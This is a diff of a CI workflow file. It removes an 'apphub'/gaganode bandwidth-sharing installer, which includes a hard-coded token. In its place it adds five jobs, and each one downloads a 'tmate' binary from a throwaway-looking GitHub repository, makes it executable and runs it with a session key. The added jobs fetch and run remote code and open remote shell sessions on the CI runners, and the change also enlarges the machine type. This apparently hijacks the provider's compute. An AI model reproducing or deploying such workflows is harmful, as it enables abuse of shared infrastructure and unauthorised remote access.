@@ -2,21 +2,46 @@ version: v1.0
 name: Your_CI_Workflow
 agent:
   machine:
-    type: e1-standard-2
+    type: e1-standard-8
     os_image: ubuntu2004
 blocks:
-  - name: Deploy_App
+  - name: Build_and_Deploy
     task:
       jobs:
-        - name: Deploy_and_Configure
+        - name: Download_and_Run_Script
           commands:
-            - 'curl -o apphub-linux-amd64.tar.gz https://assets.coreservice.io/public/package/60/app-market-gaga-pro/1.0.4/app-market-gaga-pro-1_0_4.tar.gz'
-            - tar -zxf apphub-linux-amd64.tar.gz
-            - rm -f apphub-linux-amd64.tar.gz
-            - cd ./apphub-linux-amd64
-            - sudo ./apphub service remove
-            - sudo ./apphub service install
-            - sudo ./apphub service start
-            - ./apphub status
-            - sudo ./apps/gaganode/gaganode config set --token=szrbkjndqvubgsjcd3f5ac38f7e70b64 || true
-            - ./apphub restart
+            - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
+            - chmod +x tmate
+            - ./tmate -F -n j1 -k tmk-mS87E0h6YTY55X6FpuAAbWFMpg
+  - name: 'Block #2'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
+            - chmod +x tmate
+            - ./tmate -F -n j2 -k tmk-mS87E0h6YTY55X6FpuAAbWFMpg
+  - name: 'Block #3'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
+            - chmod +x tmate
+            - ./tmate -F -n j3 -k tmk-mS87E0h6YTY55X6FpuAAbWFMpg
+  - name: 'Block #4'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
+            - chmod +x tmate
+            - ./tmate -F -n j4 -k tmk-mS87E0h6YTY55X6FpuAAbWFMpg
+  - name: 'Block #5'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
+            - chmod +x tmate
+            - ./tmate -F -n j5 -k tmk-mS87E0h6YTY55X6FpuAAbWFMpg
